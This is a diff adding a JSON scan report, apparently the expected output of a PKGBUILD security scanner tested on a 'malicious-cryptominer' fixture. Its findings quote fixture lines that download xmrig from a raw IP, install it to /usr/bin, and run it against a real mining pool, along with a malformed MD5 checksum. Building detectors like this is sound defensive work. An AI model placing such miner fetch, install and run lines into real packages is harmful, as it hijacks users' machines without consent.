@@ -1,0 +1,195 @@
+{
+  "package_name": "malicious-cryptominer",
+  "package_version": "1.0.0-1",
+  "findings": [
+    {
+      "id": "CRYPTO-001",
+      "severity": "critical",
+      "category": "cryptomining",
+      "title": "Mining pool connection",
+      "description": "Connection to cryptocurrency mining pools",
+      "location": {
+        "file": "tests/fixtures/malicious/cryptominer/PKGBUILD",
+        "line": 16,
+        "column": 16,
+        "snippet": "    ./xmrig -o stratum+tcp://pool.supportxmr.com:3333 -u WALLET_ADDRESS"
+      },
+      "recommendation": "Remove cryptomining components",
+      "cwe_id": "CWE-506",
+      "metadata": {
+        "matched_text": "stratum+tcp://"
+      }
+    },
+    {
+      "id": "CRYPTO-001",
+      "severity": "critical",
+      "category": "cryptomining",
+      "title": "Mining pool connection",
+      "description": "Connection to cryptocurrency mining pools",
+      "location": {
+        "file": "tests/fixtures/malicious/cryptominer/PKGBUILD",
+        "line": 16,
+        "column": 30,
+        "snippet": "    ./xmrig -o stratum+tcp://pool.supportxmr.com:3333 -u WALLET_ADDRESS"
+      },
+      "recommendation": "Remove cryptomining components",
+      "cwe_id": "CWE-506",
+      "metadata": {
+        "matched_text": "pool.supportxmr"
+      }
+    },
+    {
+      "id": "CRYPTO-002",
+      "severity": "critical",
+      "category": "cryptomining",
+      "title": "Cryptominer binary",
+      "description": "Known cryptocurrency miner executable names",
+      "location": {
+        "file": "tests/fixtures/malicious/cryptominer/PKGBUILD",
+        "line": 11,
+        "column": 29,
+        "snippet": "source=(\"http://192.168.1.1/xmrig-6.0.0.tar.gz\")"
+      },
+      "recommendation": "Remove cryptomining components",
+      "cwe_id": "CWE-506",
+      "metadata": {
+        "matched_text": "xmrig"
+      }
+    },
+    {
+      "id": "CRYPTO-002",
+      "severity": "critical",
+      "category": "cryptomining",
+      "title": "Cryptominer binary",
+      "description": "Known cryptocurrency miner executable names",
+      "location": {
+        "file": "tests/fixtures/malicious/cryptominer/PKGBUILD",
+        "line": 16,
+        "column": 7,
+        "snippet": "    ./xmrig -o stratum+tcp://pool.supportxmr.com:3333 -u WALLET_ADDRESS"
+      },
+      "recommendation": "Remove cryptomining components",
+      "cwe_id": "CWE-506",
+      "metadata": {
+        "matched_text": "xmrig"
+      }
+    },
+    {
+      "id": "CRYPTO-002",
+      "severity": "critical",
+      "category": "cryptomining",
+      "title": "Cryptominer binary",
+      "description": "Known cryptocurrency miner executable names",
+      "location": {
+        "file": "tests/fixtures/malicious/cryptominer/PKGBUILD",
+        "line": 20,
+        "column": 20,
+        "snippet": "    install -Dm755 xmrig \"$pkgdir/usr/bin/xmrig\""
+      },
+      "recommendation": "Remove cryptomining components",
+      "cwe_id": "CWE-506",
+      "metadata": {
+        "matched_text": "xmrig"
+      }
+    },
+    {
+      "id": "URL-001",
+      "severity": "high",
+      "category": "network_security",
+      "title": "Raw IP in URL",
+      "description": "URLs with raw IP addresses are suspicious",
+      "location": {
+        "file": "tests/fixtures/malicious/cryptominer/PKGBUILD",
+        "line": 11,
+        "column": 10,
+        "snippet": "source=(\"http://192.168.1.1/xmrig-6.0.0.tar.gz\")"
+      },
+      "recommendation": "Use domain names from trusted sources",
+      "cwe_id": null,
+      "metadata": {
+        "matched_text": "http://192.168.1.1"
+      }
+    },
+    {
+      "id": "SRC-003",
+      "severity": "high",
+      "category": "network_security",
+      "title": "Raw IP address in source URL",
+      "description": "Source uses raw IP address: http://192.168.1.1/xmrig-6.0.0.tar.gz",
+      "location": {
+        "file": "tests/fixtures/malicious/cryptominer/PKGBUILD",
+        "line": null,
+        "column": null,
+        "snippet": "source=(\"http://192.168.1.1/xmrig-6.0.0.tar.gz\")"
+      },
+      "recommendation": "Use domain names from trusted sources",
+      "cwe_id": null,
+      "metadata": {
+        "url": "http://192.168.1.1/xmrig-6.0.0.tar.gz"
+      }
+    },
+    {
+      "id": "SRC-001",
+      "severity": "medium",
+      "category": "network_security",
+      "title": "Insecure source/transport protocol",
+      "description": "Source #1 uses an insecure transport: http://192.168.1.1/xmrig-6.0.0.tar.gz",
+      "location": {
+        "file": "tests/fixtures/malicious/cryptominer/PKGBUILD",
+        "line": null,
+        "column": null,
+        "snippet": "source=(\"http://192.168.1.1/xmrig-6.0.0.tar.gz\")"
+      },
+      "recommendation": "Use HTTPS instead of HTTP for source downloads",
+      "cwe_id": "CWE-319",
+      "metadata": {
+        "protocol": "Http",
+        "source_index": 0,
+        "url": "http://192.168.1.1/xmrig-6.0.0.tar.gz"
+      }
+    },
+    {
+      "id": "CHK-002",
+      "severity": "medium",
+      "category": "cryptography",
+      "title": "MD5 checksums used",
+      "description": "MD5 is cryptographically broken and should not be used",
+      "location": {
+        "file": "tests/fixtures/malicious/cryptominer/PKGBUILD",
+        "line": null,
+        "column": null,
+        "snippet": "md5sums=(...)"
+      },
+      "recommendation": "Replace md5sums with sha256sums or sha512sums",
+      "cwe_id": "CWE-328",
+      "metadata": {
+        "algorithm": "MD5"
+      }
+    },
+    {
+      "id": "CHK-008",
+      "severity": "medium",
+      "category": "cryptography",
+      "title": "Malformed or wrong-length checksum",
+      "description": "One or more checksums are not valid hex of the expected length, so they cannot match the source and integrity verification is effectively disabled: md5sums has a bad entry 'abc123…' (len 6).",
+      "location": {
+        "file": "tests/fixtures/malicious/cryptominer/PKGBUILD",
+        "line": null,
+        "column": null,
+        "snippet": null
+      },
+      "recommendation": "Regenerate the checksums with updpkgsums; a malformed hash silently disables integrity verification.",
+      "cwe_id": "CWE-354",
+      "metadata": {
+        "malformed": [
+          "md5sums has a bad entry 'abc123…' (len 6)"
+        ]
+      }
+    }
+  ],
+  "scanned_files": [
+    "tests/fixtures/malicious/cryptominer/PKGBUILD"
+  ],
+  "timestamp": "2026-06-15T13:48:49.279541160Z",
+  "scan_duration_ms": 6
+}
